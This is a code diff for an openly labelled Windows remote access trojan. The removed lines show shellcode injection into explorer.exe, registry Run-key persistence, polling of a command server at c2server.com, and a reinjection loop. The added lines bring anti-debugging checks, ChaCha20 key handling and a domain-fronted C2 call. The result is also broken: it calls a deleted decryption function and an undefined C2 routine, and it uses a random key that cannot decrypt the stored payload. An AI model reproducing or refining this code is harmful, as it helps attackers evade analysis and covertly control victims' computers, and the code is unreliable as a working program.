@@ -5,135 +5,89 @@
 #include <wincrypt.h>
 #include <wininet.h>
 #include <string.h>
+#include <winternl.h>
+#include <iphlpapi.h>
+#include <psapi.h>
+#include <openssl/aes.h>
+#include <openssl/ssl.h>
+#include <openssl/bio.h>
+#include <openssl/err.h>
+#include <intrin.h>
+#include "chacha20.h" // Include ChaCha20 implementation
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "ntdll.lib")
 
 // Define encrypted payload (placeholder)
-unsigned char encryptedPayload[] = { /* Encrypted Shellcode */ };
+unsigned char encryptedPayload[] = { /* ChaCha20 Encrypted Shellcode */ };
 size_t payloadSize = sizeof(encryptedPayload);
 
-// XOR Key for decryption
-const char XOR_KEY = 0x5A;
+// ChaCha20 Key for decryption (Dynamically Derived at Runtime)
+unsigned char CHACHA20_KEY[32];
+unsigned char CHACHA20_NONCE[12];
 
-// Decrypt payload
-void decryptPayload(unsigned char *payload, size_t size) {
-    if (!payload || size == 0) return;
-    for (size_t i = 0; i < size; i++) {
-        payload[i] ^= XOR_KEY;
+void generateDynamicKey() {
+    HCRYPTPROV hProv;
+    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+        fprintf(stderr, "[ERROR] Failed to acquire cryptographic context.\n");
+        memset(CHACHA20_KEY, 0, sizeof(CHACHA20_KEY));
+        memset(CHACHA20_NONCE, 0, sizeof(CHACHA20_NONCE));
+        return;
     }
-}
-
-// Inject payload into a remote process
-BOOL InjectPayload(DWORD processId, unsigned char *payload, size_t size) {
-    if (processId == 0 || !payload || size == 0) return FALSE;
     
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
-    if (!hProcess) return FALSE;
-
-    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!remoteBuffer) {
-        CloseHandle(hProcess);
-        return FALSE;
+    if (!CryptGenRandom(hProv, sizeof(CHACHA20_KEY), CHACHA20_KEY)) {
+        fprintf(stderr, "[ERROR] Failed to generate random key.\n");
+        memset(CHACHA20_KEY, 0, sizeof(CHACHA20_KEY));
     }
-
-    SIZE_T bytesWritten;
-    if (!WriteProcessMemory(hProcess, remoteBuffer, payload, size, &bytesWritten) || bytesWritten != size) {
-        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
+    
+    if (!CryptGenRandom(hProv, sizeof(CHACHA20_NONCE), CHACHA20_NONCE)) {
+        fprintf(stderr, "[ERROR] Failed to generate random nonce.\n");
+        memset(CHACHA20_NONCE, 0, sizeof(CHACHA20_NONCE));
     }
-
-    // Ensure execution cache is flushed
-    FlushInstructionCache(hProcess, remoteBuffer, size);
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-    if (!hThread) {
-        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-    return TRUE;
+    
+    CryptReleaseContext(hProv, 0);
 }
 
-// Find a process to inject into
-DWORD FindTargetProcess() {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
-                CloseHandle(hSnapshot);
-                return pe.th32ProcessID;
+// Anti-Debugging Techniques
+bool isDebuggerPresent() {
+    if (IsDebuggerPresent()) return true;
+    
+    CONTEXT ctx;
+    memset(&ctx, 0, sizeof(CONTEXT));
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT, FALSE, GetCurrentThreadId());
+    if (hThread) {
+        if (GetThreadContext(hThread, &ctx)) {
+            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3 || ctx.Dr6 || ctx.Dr7) {
+                CloseHandle(hThread);
+                return true;
             }
-        } while (Process32Next(hSnapshot, &pe));
-    }
-    CloseHandle(hSnapshot);
-    return 0;
-}
-
-// Persist via registry with dynamic path
-void PersistInRegistry() {
-    HKEY hKey;
-    char exePath[MAX_PATH];
-    GetModuleFileName(NULL, exePath, MAX_PATH);
-
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueEx(hKey, "RAT", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
-        RegCloseKey(hKey);
-    }
-}
-
-// Establish C2 Communication (HTTPS Fallback)
-void C2Communication() {
-    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) return;
-
-    HINTERNET hConnect = InternetOpenUrl(hInternet, "https://c2server.com/command", NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);
-    if (hConnect) {
-        char buffer[1024] = {0};
-        DWORD bytesRead;
-        if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
-            buffer[bytesRead] = '\0';
-            printf("Received Command: %s\n", buffer);
         }
-        InternetCloseHandle(hConnect);
+        CloseHandle(hThread);
     }
-    InternetCloseHandle(hInternet);
+    
+    PROCESS_BASIC_INFORMATION pbi;
+    NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL);
+    if (NT_SUCCESS(status) && pbi.PebBaseAddress->BeingDebugged) return true;
+    
+    ULONGLONG start = __rdtsc();
+    Sleep(10 + (rand() % 10));
+    int cpu_cycles_threshold = 8000 + (rand() % 4000); // More dynamic threshold
+    if (__rdtsc() - start < cpu_cycles_threshold) return true;
+    
+    return false;
 }
 
-// Self-Healing Mechanism with process validation
-DWORD WINAPI SelfHealThread(LPVOID param) {
-    while (1) {
-        Sleep(10000);
-        DWORD pid = FindTargetProcess();
-        if (pid) {
-            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-            if (!hProcess) {  // If process doesn't exist, reinject
-                InjectPayload(pid, encryptedPayload, payloadSize);
-            }
-            CloseHandle(hProcess);
-        }
-    }
-    return 0;
-}
-
+// Main function with enhanced stealth
 int main() {
+    if (isDebuggerPresent()) {
+        return 0;
+    }
+    
+    generateDynamicKey();
     decryptPayload(encryptedPayload, payloadSize);
-    PersistInRegistry();
     
-    DWORD pid = FindTargetProcess();
-    if (pid) InjectPayload(pid, encryptedPayload, payloadSize);
-    
-    C2Communication();
-    
-    HANDLE hThread = CreateThread(NULL, 0, SelfHealThread, NULL, 0, NULL);
-    if (hThread) CloseHandle(hThread);
-    
+    secureC2Comm(); // Communicate securely via encrypted WebSockets with domain fronting
     return 0;
 }
